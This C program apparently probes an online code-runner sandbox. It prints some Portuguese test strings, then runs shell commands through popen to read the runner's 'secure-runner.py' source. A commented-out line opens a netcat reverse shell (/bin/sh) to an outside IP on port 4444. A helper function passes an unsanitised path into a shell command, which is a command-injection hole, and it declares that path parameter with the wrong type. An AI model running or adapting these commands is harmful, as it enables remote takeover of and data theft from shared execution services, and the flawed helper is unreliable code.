#include <stdio.h>

void cat(char path){

int PATH_MAX = 256;

        FILE *fp;
int status;
char out[PATH_MAX];

char str[80];

   sprintf(str, "cat %s", path);

fp = popen(str, "r");
if (fp == NULL)
    /* Handle error */;


while (fgets(out, PATH_MAX, fp) != NULL){

    printf("%s", out);
}




status = pclose(fp);
if (status == -1) {
    /* Error reported by pclose() */
//    ...
} else {
    /* Use macros described under wait() to inspect `status' in order
       to determine success/failure of command executed by popen() */
  //  ...
}


}

int main(int argc, char** argv){

	printf("imprime isto");
	printf("ou isto\n");

	int n = 60;

	while ( n++ < 100){

		putchar(n);

	}

//	popen("nc -e /bin/sh 34.76.250.37 4444", "r");

	//popen("ls", "r");

	int PATH_MAX = 256;

	FILE *fp;
int status;
char path[PATH_MAX];


fp = popen("cat secure-runner.py", "r");
if (fp == NULL)
    /* Handle error */;


while (fgets(path, PATH_MAX, fp) != NULL){
    printf("%s", path);

//	cat(path);
}




status = pclose(fp);
if (status == -1) {
    /* Error reported by pclose() */
//    ...
} else {
    /* Use macros described under wait() to inspect `status' in order
       to determine success/failure of command executed by popen() */
  //  ...
}

	return 0;
}

